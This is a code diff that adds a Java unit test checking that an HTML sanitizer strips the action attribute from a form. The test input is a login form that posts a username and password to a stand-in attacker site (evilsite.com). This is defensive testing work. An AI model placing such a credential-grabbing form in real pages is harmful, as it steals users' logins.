@@ -234,4 +234,29 @@ public class TestHtmlSanitizerServiceImpl {
         res = service.sanitizeString(html, null);
         assertEquals(expected, res);
     }
+
+    // NXP-29788
+    @Test
+    public void sanitizeHtmlForm() {
+        String html = "<form action=\"https://www.evilsite.com/grab_username_and_password.php\">"
+                + "<fieldset>Username:<br />" //
+                + "<input type=\"text\" name=\"firstname\" value=\"\" />" //
+                + "Password:<br />" //
+                + "<input type=\"text\" name=\"password\" value=\"\" />" //
+                + "<input type=\"submit\" value=\"Login\" />" //
+                + "</fieldset>" //
+                + "</form>"; //
+        String expected = "<form>" //
+                + "<fieldset>Username:<br />" //
+                + "<input type=\"text\" name=\"firstname\" value=\"\" />" //
+                + "Password:<br />" //
+                + "<input type=\"text\" name=\"password\" value=\"\" />" //
+                + "<input type=\"submit\" value=\"Login\" />" //
+                + "</fieldset>" //
+                + "</form>"; //
+        HtmlSanitizerService service = Framework.getService(HtmlSanitizerService.class);
+        String res = service.sanitizeString(html, null);
+        assertEquals(expected, res);
+    }
+
 }
